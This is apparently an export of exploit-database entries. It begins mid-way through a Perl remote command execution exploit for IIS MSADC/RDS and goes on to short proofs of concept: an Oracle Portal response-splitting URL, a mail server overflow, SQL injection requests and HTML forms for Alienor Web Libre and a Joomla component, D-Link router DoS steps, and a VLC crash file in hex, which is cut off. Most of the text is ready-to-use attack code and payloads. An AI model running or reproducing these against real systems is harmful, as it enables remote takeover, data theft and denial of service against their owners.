""\\system32\\ias\\ias.mdb"",                 ""\\system32\\ias\dnary.mdb"",                 ""\\system32\\certlog\\certsrv.mdb"" ); #these are %systemroot% @mdbs=( ""\\cfusion\\cfapps\\cfappman\\data\\applications.mdb"",         ""\\cfusion\\cfapps\\forums\\forums_.mdb"",         ""\\cfusion\\cfapps\\forums\\data\\forums.mdb"",         ""\\cfusion\\cfapps\\security\\realm_.mdb"",         ""\\cfusion\\cfapps\\security\\data\\realm.mdb"",         ""\\cfusion\\database\\cfexamples.mdb"",         ""\\cfusion\\database\\cfsnippets.mdb"",         ""\\inetpub\\iissamples\\sdk\\asp\\database\\authors.mdb"",         ""\\progra~1\\common~1\\system\\msadc\\samples\\advworks.mdb"",         ""\\cfusion\\brighttiger\\database\\cleam.mdb"",         ""\\cfusion\\database\\smpolicy.mdb"",         ""\\cfusion\\database\cypress.mdb"",         ""\\progra~1\\ableco~1\\ablecommerce\\databases\\acb2_main1.mdb"",         ""\\website\\cgi-win\\dbsample.mdb"",         ""\\perl\\prk\\bookexamples\\modsamp\\database\\contact.mdb"",         ""\\perl\\prk\\bookexamples\\utilsamp\\data\\access\\prk.mdb""         );  #these are just \ ###########################################################  $ip=$args{h}; $clen=0; $reqlen=0; $|=1; $target=""""; if (defined $args{v}) { $verbose=1; } else {$verbose=0;}  if (defined $args{d}) { $delay=$args{d};} else {$delay=1;} if(!defined $args{R}){ $target= inet_aton($ip)          || die(""inet_aton problems; host doesn't exist?"");} if (!defined $args{R}){ $ret = &has_msadc; }  if (defined $args{X}) { &hork_idx; exit; } if (defined $args{N}) { &get_name; exit; }  if (defined $args{w}){$comm=""command /c"";} else {$comm=""cmd /c"";} if (defined $args{R}) { &load; exit; }  print ""Type the command line you want to run ($comm assumed):\n""         . ""$comm ""; $in=<STDIN>;    chomp $in; $command=""$comm "" . $in ;  if (!defined $args{s} || $args{s}==1){ print ""\nStep 1: Trying raw driver to btcustmr.mdb\n""; &try_btcustmr;}  if (!defined $args{s} || $args{s}==2){ print ""\nStep 2: Trying to make our own DSN...""; if (&make_dsn){ print ""<<success>>\n""; sleep(3); } else {         print ""<<fail>>\n""; }}   # we need to sleep to let the server catchup  if (!defined $args{s} || $args{s}==3){ print ""\nStep 3: Trying known DSNs...""; &known_dsn;}  if (!defined $args{s} || $args{s}==4){ print ""\nStep 4: Trying known .mdbs...""; &known_mdb;}  if (!defined $args{s} || $args{s}==5){ if (defined $args{u}){ print ""\xStep 5: Trying UNC...""; &use_unc; } else { ""\nNo -u; Step 5 skipped.\n""; }}  if (!defined $args{s} || $args{s}==6){ if (defined $args{e}){ print ""\nStep 6: Trying dictionary of DSN names...""; &dsn_dict; } else { ""\nNo -e; Step 6 skipped.\n""; }}  print ""\n\nNo luck, guess you'll have to use a real hack, eh?\n""; exit;  ##############################################################################  sub sendraw {   # this saves the whole transaction anyway         my ($pstr)=@_;         socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||                 die(""Socket problems\n"");         if(connect(S,pack ""SnA4x8"",2,80,$target)){                 open(OUT,"">raw.out"");   my @in;                 select(S);      $|=1;   print $pstr;                             while(<S>){ print OUT $_; push @in, $_;                          print STDOUT ""."" if(defined $args{X});}                 close(OUT); select(STDOUT); close(S); return @in;         } else { die(""Can't connect...\n""); }}  ##############################################################################  sub make_header {  # make the HTTP request my $aa, $bb; if (defined $args{V}){ $aa=""VbBusObj.VbBusObjCls.GetRecordset""; $bb=""2""; } else { $aa=""AdvancedDataFactory.Query""; $bb=""3"";}  $msadc=<<EOT POST /msadc/msadcs.dll/$aa HTTP/1.1 User-Agent: ACTIVEDATA Host: $ip Content-Length: $clen Connection: Keep-Alive  ADCClientVersion:01.06 Content-Type: multipart/mixed; boundary=!ADM!ROX!YOUR!WORLD!; num-args=$bb  --!ADM!ROX!YOUR!WORLD! Content-Type: application/x-varg Content-Length: $reqlen  EOT ; $msadc=~s/\n/\r\n/g; return $msadc;}  ##############################################################################  sub make_req {  # make the RDS request my ($switch, $p1, $p2)=@_; my $req=""""; my $t1, $t2, $query, $dsn;  if ($switch==1){ # this is the btcustmr.mdb query $query=""Select * from Customers where City='|shell(\""$command\"")|'""; $dsn=""driver={Microsoft Access Driver (*.mdb)};dbq="" .         $p1 . "":\\"" . $p2 . ""\\help\\iis\\htm\\tutorial\\btcustmr.mdb;"";}  elsif ($switch==2){ # this is general make table query $query=""create table AZZ (B int, C varchar(10))""; $dsn=""$p1"";}  elsif ($switch==3){ # this is general exploit table query $query=""select * from AZZ where C='|shell(\""$command\"")|'""; $dsn=""$p1"";}  elsif ($switch==4){ # attempt to hork file info from index server $query=""select path from scope()""; $dsn=""Provider=MSIDXS;"";}  elsif ($switch==5){ # bad query $query=""select""; $dsn=""$p1"";}  elsif ($switch==6){ # this is table-independant query (new) $query=""select * from MSysModules where name='|shell(\""$command\"")|'""; $dsn=""$p1"";}  $t1= make_unicode($query); $t2= make_unicode($dsn); if(defined $args{V}) { $req=""""; } else {$req = ""\x02\x00\x03\x00""; } $req.= ""\x08\x00"" . pack (""S1"", length($t1)); $req.= ""\x00\x00"" . $t1 ; $req.= ""\x08\x00"" . pack (""S1"", length($t2)); $req.= ""\x00\x00"" . $t2 ; $req.=""\r\n--!ADM!ROX!YOUR!WORLD!--\r\n""; return $req;}  ##############################################################################  sub make_unicode { # quick little function to convert to unicode my ($in)=@_; my $out; for ($c=0; $c < length($in); $c++) { $out.=substr($in,$c,1) . ""\x00""; } return $out;}  ##############################################################################  sub rdo_success {  # checks for RDO return success (this is kludge) my (@in) = @_; my $base=content_start(@in); if($in[$base]=~/multipart\/mixed/){ return 1 if( $in[$base+10]=~/^\x09\x00/ );} return 0;}  ##############################################################################  sub make_dsn {  # this (tries to) make a DSN for us print ""\nMaking DSN: ""; foreach $drive (@drives) { print ""$drive: ""; my @results=sendraw(""GET /scripts/tools/newdsn.exe?driver=Microsoft\%2B"" .         ""Access\%2BDriver\%2B\%28*.mdb\%29\&dsn=wicca\&dbq=""         . $drive . ""\%3A\%5Csys.mdb\&newdb=CREATE_DB\&attr= HTTP/1.0\n\n""); $results[0]=~m#HTTP\/([0-9\.]+) ([0-9]+) ([^\n]*)#; return 0 if $2 eq ""404""; # not found/doesn't exist if($2 eq ""200"") {   foreach $line (@results) {     return 1 if $line=~/<H2>Datasource creation successful<\/H2>/;}} } return 0;}  ##############################################################################  sub verify_exists { my ($page)=@_; my @results=sendraw(""GET $page HTTP/1.0\n\n""); return $results[0];}  ##############################################################################  sub try_btcustmr {  foreach $dir (@sysdirs) {  print ""$dir -> ""; # fun status so you can see progress  foreach $drive (@drives) {  print ""$drive: "";  # ditto $reqlen=length( make_req(1,$drive,$dir) ) - 28; $reqlenlen=length( ""$reqlen"" ); $clen= 206 + $reqlenlen + $reqlen;  my @results=sendraw(make_header() . make_req(1,$drive,$dir)); if (rdo_success(@results)){print ""Success!\n"";  save(""dbq="".$drive."":\\"".$dir.""\\help\\iis\\htm\\tutorial\\btcustmr.mdb;"");         exit;} else { verbose(odbc_error(@results)); funky(@results);}} print ""\n"";}}  ##############################################################################  sub odbc_error { my (@in)=@_; my $base; my $base = content_start(@in); if($in[$base]=~/application\/x-varg/){ # it *SHOULD* be this $in[$base+4]=~s/[^a-zA-Z0-9 \[\]\:\/\\'\(\)]//g;  $in[$base+5]=~s/[^a-zA-Z0-9 \[\]\:\/\\'\(\)]//g;  $in[$base+6]=~s/[^a-zA-Z0-9 \[\]\:\/\\'\(\)]//g;  return $in[$base+4].$in[$base+5].$in[$base+6];} print ""\nNON-STANDARD error.  Please sent this info to rfp\@wiretrip.net:\n""; print ""$in : "" . $in[$base] . $in[$base+1] . $in[$base+2] . $in[$base+3] .         $in[$base+4] . $in[$base+5] . $in[$base+6]; exit;}  ##############################################################################  sub verbose { my ($in)=@_; return if !$verbose; print STDOUT ""\n$in\n"";}  ##############################################################################  sub save { my ($p1)=@_; my $ropt=""""; open(OUT, "">rds.save"") || print ""Problem saving parameters...\n""; if (defined $args{c}){ $ropt=""c "";} if (defined $args{V}){ $ropt.=""V "";} if (defined $args{w}){ $ropt.=""w "";} print OUT ""v2\n$ip\n$ropt\n$p1\n""; close OUT;}  ##############################################################################  sub load { my ($action)=@_; my @p; my $drvst=""driver={Microsoft Access Driver (*.mdb)};""; open(IN,""<rds.save"") || die(""Couldn't open rds.save\n""); @p=<IN>; close(IN); die(""Wrong rds.save version"") if $p[0] ne ""v2\n""; $ip=""$p[1]""; $ip=~s/\n//g; $target= inet_aton($ip) || die(""inet_aton problems""); print ""Resuming to $ip ...""; @switches=split(/ /,$p[2]); foreach $switch (@switches) {         $args{$switch}=""1"";}  if (defined $args{w}){$comm=""command /c"";} else {$comm=""cmd /c"";} print ""Type the command line you want to run ($comm assumed):\n""         . ""$comm ""; $in=<STDIN>;    chomp $in; $command=""$comm "" . $in ;  $torun=""$p[3]""; $torun=~s/\n//g; if($torun=~/btcustmr/){          $args{'c'}=""1"";}   # this is a kludge to make it work  if($torun=~/^dbq/){ $torun=$drvst.$torun; }  if(run_query(""$torun"")){         print ""Success!\n"";} else { print ""failed\n""; } exit;}  ##############################################################################  sub create_table { return 1 if (!defined $args{c}); return 1 if (defined $args{V}); my ($in)=@_; $reqlen=length( make_req(2,$in,"""") ) - 28; $reqlenlen=length( ""$reqlen"" ); $clen= 206 + $reqlenlen + $reqlen; my @results=sendraw(make_header() . make_req(2,$in,"""")); return 1 if rdo_success(@results); my $temp= odbc_error(@results);  verbose($temp); return 1 if $temp=~/Table 'AZZ' already exists/; return 0;}  ##############################################################################  sub known_dsn { foreach $dSn (@dsns) {         print ""."";         next if (!is_access(""DSN=$dSn""));         if(create_table(""DSN=$dSn"")){         if(run_query(""DSN=$dSn"")){         print ""$dSn: Success!\n""; save (""dsn=$dSn""); exit; }}} print ""\n"";}  ##############################################################################  sub is_access { my ($in)=@_; return 1 if (!defined $args{c}); return 1 if (defined $args{V}); $reqlen=length( make_req(5,$in,"""") ) - 28; $reqlenlen=length( ""$reqlen"" ); $clen= 206 + $reqlenlen + $reqlen; my @results=sendraw(make_header() . make_req(5,$in,"""")); my $temp= odbc_error(@results); verbose($temp); return 1 if ($temp=~/Microsoft Access/); return 0;}  ##############################################################################  sub run_query { my ($in)=@_; my $req; if (defined $args{c}){$req=3;} else {$req=6;} $reqlen=length( make_req($req,$in,"""") ) - 28;  $reqlenlen=length( ""$reqlen"" ); $clen= 206 + $reqlenlen + $reqlen; my @results=sendraw(make_header() . make_req($req,$in,"""")); return 1 if rdo_success(@results); my $temp= odbc_error(@results);  verbose($temp); return 0;}  ##############################################################################  sub known_mdb { my @drives=(""c"",""d"",""e"",""f"",""g""); my @dirs=(""winnt"",""winnt35"",""winnt351"",""win"",""windows""); my $dir, $drive, $mdb; my $drv=""driver={Microsoft Access Driver (*.mdb)}; dbq="";  foreach $drive (@drives) {  foreach $dir (@sysdirs){   foreach $mdb (@sysmdbs) {    print ""."";    if(create_table($drv.$drive."":\\"".$dir.$mdb)){     if(run_query($drv . $drive . "":\\"" . $dir . $mdb)){      print ""$mdb: Success!\n""; save (""dbq="".$drive ."":\\"".$dir.$mdb); exit;      }}}}}   foreach $drive (@drives) {   foreach $mdb (@mdbs) {    print ""."";    if(create_table($drv.$drive."":"".$mdb)){     if(run_query($drv.$drive."":"".$mdb)){      print ""$mdb: Success!\n""; save (""dbq="".$drive."":"".$mdb); exit;      }}}} }  ##############################################################################  sub hork_idx { print ""\nAttempting to dump Index Server tables...\n""; print ""  NOTE:  Sometimes this takes a while, other times it stalls\n\n""; $reqlen=length( make_req(4,"""","""") ) - 28; $reqlenlen=length( ""$reqlen"" ); $clen= 206 + $reqlenlen + $reqlen; my @results=sendraw(make_header() . make_req(4,"""","""")); if (rdo_success(@results)){ my $max=@results; my $c; my %d; for($c=19; $c<$max; $c++){         $results[$c]=~s/\x00//g;         $results[$c]=~s/[^a-zA-Z0-9:~ \\\._]{1,40}/\n/g;         $results[$c]=~s/[^a-zA-Z0-9:~ \\\._\n]//g;         $results[$c]=~/([a-zA-Z]\:\\)([a-zA-Z0-9 _~\\]+)\\/;         $d{""$1$2""}="""";} foreach $c (keys %d){ print ""$c\n""; } } else {print ""Index server not installed/query failed\n""; }}  ##############################################################################  sub dsn_dict { open(IN, ""<$args{e}"") || die(""Can't open external dictionary\n""); while(<IN>){         $hold=$_; $hold=~s/[\r\n]//g; $dSn=""$hold""; print ""."";         next if (!is_access(""DSN=$dSn""));         if(create_table(""DSN=$dSn"")){         if(run_query(""DSN=$dSn"")){         print ""Success!\n""; save (""dsn=$dSn""); exit; }}}  print ""\n""; close(IN);}  ##############################################################################  sub content_start { # this will take in the server headers my (@in)=@_; my $c; for ($c=1;$c<500;$c++) { # assume there's less than 500 headers  if($in[$c] =~/^\x0d\x0a/){   if ($in[$c+1]=~/^HTTP\/1.[01] [12]00/) { $c++; }   else { return $c+1; }}} return -1;} # it should never get here actually   ##############################################################################  sub funky { my (@in)=@_; my $error=odbc_error(@in); if($error=~/ADO could not find the specified provider/){ print ""\nServer returned an ADO miscofiguration message\nAborting.\n""; exit;} if($error=~/A Handler is required/){ print ""\nServer has custom handler filters (they most likely are patched)\n""; exit;} if($error=~/specified Handler has denied Access/){ print ""\nADO handlers denied access (they most likely are patched)\n""; exit;} if($error=~/server has denied access/){ print ""\nADO handlers denied access (they most likely are patched)\n""; exit;}}  ##############################################################################  sub has_msadc { my @results=sendraw(""GET /msadc/msadcs.dll HTTP/1.0\n\n""); my $base=content_start(@results); return if($results[$base]=~/Content-Type: application\/x-varg/); my @s=grep(""Server: "",@results); if($s[0]!~/IIS/){ print ""Doh! They're not running IIS.\n$s[0]\n"" } else { print ""/msadc/msadcs.dll was not found.\n"";} exit;}  ##############################################################################  sub use_unc { $uncpath=$args{u}; $driverline=""driver={Microsoft Access Driver (*.mdb)};dbq=""; if(!$uncpath=~/^\\\\[a-zA-Z0-9_.]+\\[-a-zA-Z0-9_]+\\.+/){         print   ""Your UNC path sucks.  You need the following format:\n"".                 ""\\server(ip preferable)\share\some-file.mdb\n\n""; exit; }  if(create_table($driverline.$uncpath)){   if(run_query($driverline.$uncpath)){      print ""Success!\n""; save (""dbq="".$uncpath); exit;}} }  ##############################################################################  sub get_name { # this was added last minute my $msadc=<<EOT POST /msadc/msadcs.dll/VbBusObj.VbBusObjCls.GetMachineName HTTP/1.1 User-Agent: ACTIVEDATA Host: $ip Content-Length: 126 Connection: Keep-Alive  ADCClientVersion:01.06 Content-Type: multipart/mixed; boundary=!ADM!ROX!YOUR!WORLD!; num-args=0  --!ADM!ROX!YOUR!WORLD!-- EOT ;  $msadc=~s/\n/\r\n/g; my @results=sendraw($msadc); my $base=content_start(@results); $results[$base+6]=~s/[^-A-Za-z0-9!\@\#\$\%^\&*()\[\]_=+~<>.,?]//g; print ""Machine name: $results[$base+6]\n"";}  ############################################################################## # special greets to trambottic, hex_edit, vacuum (technotronic), all #!adm, # #!w00w00 & #rhino9 (that's a lot of people, and they are all very elite and  # good friends!), wiretrip, l0pht, nmrc & all of phrack # # thumbs up to packetstorm, hackernews, phrack, securityfocus, ntsecadvice # # I wish I could really name everyone, but I can't.  Don't feel slighted if # your not on the list... :) ##############################################################################",remote,remote,1
29301,"Oracle Portal 9.0.2 - Calendar.jsp Multiple HTTP Response Splitting Vulnerabilities source: https://www.securityfocus.com/bid/21686/info  Oracle Portal is prone to multiple HTTP response-splitting vulnerabilities because the application fails to properly sanitize user-supplied input.   A remote attacker may exploit these vulnerabilities to influence or misrepresent how web content is served, cached, or interpreted. This could aid in various attacks that attempt to entice client users into a false sense of trust.  Versions 10g and 9.0.2 are vulnerable; other versions may also be affected.  http://www.example.com/webapp/jsp/calendar.jsp?enc=iso-8859-1%0d%0aContent-length=12%0d%0a%0d%0a%3Cscript%3Ealert('hi')%3C/script%3E",remote,webapps,1
19976,Concatus IMate Web Mail Server 2.5 - Remote Buffer Overflow source: https://www.securityfocus.com/bid/1286/info  Sending an email to a Concatus IMate Web Mail Server 2.5 with a server name consisting of over 1119 characters will cause the application to crash. Restarting the program is required in order to regain normal functionality.  Telnet target 25 HELO <String of 1119 characters or more>,remote,remote,1
45827,"Alienor Web Libre 2.0 - SQL Injection # Exploit Title: Alienor Web Libre 2.0 - SQL Injection # Dork: N/A # Date: 2018-11-08 # Exploit Author: Ihsan Sencan # Vendor Homepage: http://alienor.org/ # Software Link: https://excellmedia.dl.sourceforge.net/project/alienorweblibre/alienorweblibre.zip # Version: 2.0 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A  # POC:  # 1) # http://localhost/[PATH]/index.php #  POST /[PATH]/index.php HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=aehrspv1bfhbp1iqhkl1107vd7 Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 306 identifiant=12'||(SeleCT%20'Efe'%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||'&mot_de_passe=&inventaire=Inventaire HTTP/1.1 200 OK Date: Thu, 08 Nov 2018 22:07:19 GMT Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30 X-Powered-By: PHP/5.6.30 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Content-Length: 81 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8",remote,webapps,1
30024,LibEXIF 0.6.x - Exif_Data_Load_Data_Entry Remote Integer Overflow source: https://www.securityfocus.com/bid/23927/info  The libexif library is prone to an integer-overflow vulnerability because the software fails to properly ensure that integer math operations do not result in overflows.  Successful exploits of this vulnerability allow remote attackers to execute arbitrary machine code in the context of an application using the vulnerable library. Failed attempts will likely result in denial-of-service conditions.  Versions of libexif prior to 0.6.14 are vulnerable to this issue.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/30024.jpg,remote,dos,1
43976,"Joomla! Component Zh GoogleMap 8.4.0.0 - SQL Injection <!-- # # # # # # Exploit Title: Joomla! Component Zh GoogleMap 8.4.0.0 - SQL Injection # Dork: N/A # Date: 04.02.2018 # Vendor Homepage: http://zhuk.cc/ # Software Link: https://extensions.joomla.org/extensions/extension/maps-a-weather/maps-a-locations/zh-googlemap/ # Software Download: http://zhuk.cc/files/pkg_zhgooglemap-j30-8.4.0.0-final.zip # Version: 8.4.0.0 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: CVE-2018-6582 # # # # # # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Social: @ihsansencan # Want To Donate ? # BTC : 1NGEp2eNWRCE6gp2i31UPN6G6KBzMDdCyZ # ETH : 0xd606c6b86a1b88c7fcc1f58f7659cfd968449cf2 # # # # # # Description: # The vulnerability allows an attacker to inject sql commands.... #  # Proof of Concept:  #  # # # # # --> <html> <body> <!--com_zhgooglemap/controller.php-->  <!--# 1)--> <!--L 30: public function getPlacemarkDetails() {........}--> <form action=""http://localhost/[PATH]/index.php?option=com_zhgooglemap&no_html=1&format=raw&task=getPlacemarkDetails"" method=""post""> <input name=""id"" value=""-11 UNION ALL SELECT 11,11,11,11,11,11,11,11,CONCAT((SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e116f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%1,4,0x30),0x3a20,table_name,0x3c62723e))))x)),11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11--"" type=""hidden""> <input type=""submit"" value=""1-Ver Ayari""> </form>  <!--# 2)--> <!--L 363: public function getPlacemarkHoverText() {........}--> <form action=""http://localhost/[PATH]/index.php?option=com_zhgooglemap&no_html=1&format=raw&task=getPlacemarkHoverText"" method=""post""> <input name=""id"" value=""-22 UNION ALL SELECT 22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,CONCAT((SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e116f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%1,4,0x30),0x3a20,table_name,0x3c62723e))))x)),22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22--"" type=""hidden""> <input type=""submit"" value=""2-Ver Ayari""> </form>  <!--# 3)--> <!--L 418: public function getPathHoverText() {........}--> <form action=""http://localhost/[PATH]/index.php?option=com_zhgooglemap&no_html=1&format=raw&task=getPathHoverText"" method=""post""> <input name=""id"" value=""-33 UNION ALL SELECT 33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,CONCAT((SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e336f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%1,4,0x30),0x3a20,table_name,0x3c62723e))))x)),33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33--"" type=""hidden""> <input type=""submit"" value=""3-Ver Ayari""> </form>  <!--# 4)--> <!--L 763: public function getPathDetails() {........}--> <form action=""http://localhost/[PATH]/index.php?option=com_zhgooglemap&no_html=1&format=raw&task=getPathDetails"" method=""post""> <input name=""id"" value=""-44 UNION ALL SELECT 44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,CONCAT((SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e116f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%1,4,0x30),0x3a20,table_name,0x3c62723e))))x)),44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44--"" type=""hidden""> <input type=""submit"" value=""4-Ver Ayari""> </form>  </body> </html>",remote,webapps,1
45317,"D-Link DIR-615 - Denial of Service (PoC) # Exploit Title: D-Link DIR-615 - Denial of Service (PoC) # Date: 2018-08-09 # Vendor Homepage: http://www.dlink.co.in # Hardware Link:  https://www.amazon.in/D-Link-DIR-615-Wireless-N300-Router-Black/dp/B0085IATT6 # Version: D-Link DIR-615 # Category: Hardware # Exploit Author:  Aniket Dinda # Tested on: Linux (kali linux) # Web: https://hackingvila.wordpress.com/2018/08/24/d-link-dir-615-buffer-overflow-via-a-long-authorization-http-header-click-here/ # Cve: CVE-2018-15839  # Proof Of Concept:  1- First connect to this network 2- Open BurpSuite and then start the intercept, making the necessary proxy changes to the internet browser. 3- Goto Easy setup >  4- Now as the Burp is intercept is on, you will find an Authorization: Basic or cookie: SessionId followed by a string. Now we paste a string consisting oaf 5000 zeros. 5- Then forward the connection 6- Then your router automatically log out and the net connection will be gone.",remote,dos,1
18757,"VideoLAN VLC Media Player 2.0.1 - '.mp4' Crash (PoC) ########################################################################################################### Application  : VLC 2.0.1 division by zero vulnerability Versions : 2.0.1 Date :  19/04/2012 Auther : Senator of Pirates E-Mail :  Senator.of.Pirates.team@gmail.com FaceBook : /SenatorofPiratesInfo  ############################################################################################################ Bug  : ---- division by zero vulnerability during the handling of the  MP4 files. some values is read from file and will be division so that  values it's under control so we have to modified some bytes for occur  crash. PoC : ----- Data =  ""\x00\x00\x00\x1C\x66\x74\x79\x70\x6D\x70\x34\x32\x00\x00\x00\x00\x69\x73\x6F\x6D\x61\x76\x63\x31\x6D\x70\x34\x32\x00\x01\x19\x28\x6D\x6F\x6F\x76\x00\x00\x00\x6C\x6D\x76\x68\x64\x00\x00\x00\x00\xC7\x21\xFC\x5B\xC7\x21\xFC\x5B\x00\x00\x02\x58\x00\x02\x22\xA8\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x15\x69\x6F\x64\x73\x00\x00\x00\x00\x10\x07\x00\x4F\xFF\xFF\x29\x15\xFF\x00\x00\xA5\xE5\x74\x72\x61\x6B\x00\x00\x00\x5C\x74\x6B\x68\x64\x00\x00\x00\x01\xC7\x21\xFC\x5B\xC7\x21\xFC\x5B\x00\x00\x00\x01\x00\x00\x00\x00\x00\x02\x22\x9C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\xA5\x81\x6D\x64\x69\x61\x00\x00\x00\x20\x6D\x64\x68\x64\x00\x00\x00\x00\xC7\x21\xFC\x5B\xC7\x21\xFC\x5B\x00\x00\x00\x00\x00\x9C\xF0\x00\x55\xC4\x00\x00\x00\x00\x00\x42\x68\x64\x6C\x72\x00\x00\x00\x00\x00\x00\x00\x00\x73\x6F\x75\x6E\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28\x43\x29\x20\x32\x30\x30\x37\x20\x47\x6F\x6F\x67\x6C\x65\x20\x49\x6E\x63\x2E\x20\x76\x30\x38\x2E\x31\x33\x2E\x32\x30\x30\x37\x2E\x00\x00\x00\xA5\x17\x6D\x69\x6E\x66\x00\x00\x00\x10\x73\x6D\x68\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x24\x64\x69\x6E\x66\x00\x00\x00\x1C\x64\x72\x65\x66\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0C\x75\x72\x6C\x20\x00\x00\x00\x01\x00\x00\xA4\xDB\x73\x74\x62\x6C\x00\x00\x00\x5B\x73\x74\x73\x64\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x4B\x6D\x70\x34\x61\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x10\x00\x00\x00\x00\xAC\x44\x00\x00\x00\x00\x00\x27\x65\x73\x64\x73\x00\x00\x00\x00\x03\x19\x00\x00\x00\x04\x11\x40\x15\x00\x01\xE6\x00\x02\x2D\x38\x00\x01\xCD\x28\x05\x02\x12\x10\x06\x01\x02\x00\x00\x00\x18\x73\x74\x74\x73\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x27\x3C\x00\x00\x04\x00\x00\x00\x00\x28\x73\x74\x73\x63\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x16\x00\x00\x00\x01\x00\x00\x01\xC9\x00\x00\x00\x0C\x00\x00\x00\x01\x00\x00\x9D\x04\x73\x74\x73\x7A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x27\x3C\x00\x00\x00\x09\x00\x00\x00\x09\x00\x00\x00\x09\x00\x00\x00\x09\x00\x00\x00\x09\x00\x00\x00\x09\x00\x00\x01\x6D\x00\x00\x01\x5F\x00\x00\x01\x8E\x00\x00\x01\x76\x00\x00\x01\x7B\x00\x00\x01\x72\x00\x00\x01\x76\x00\x00\x01\x7E\x00\x00\x01\x75\x00\x00\x01\x7B\x00\x00\x01\x74\x00\x00\x01\x75\x00\x00\x01\x71\x00\x00\x01\x6B\x00\x00\x01\x61\x00\x00\x01\x63\x00\x00\x01\x6D\x00\x00\x01\x5E\x00\x00\x01\x66\x00\x00\x01\x5D\x00\x00\x01\x55\x00\x00\x01\x5D\x00\x00\x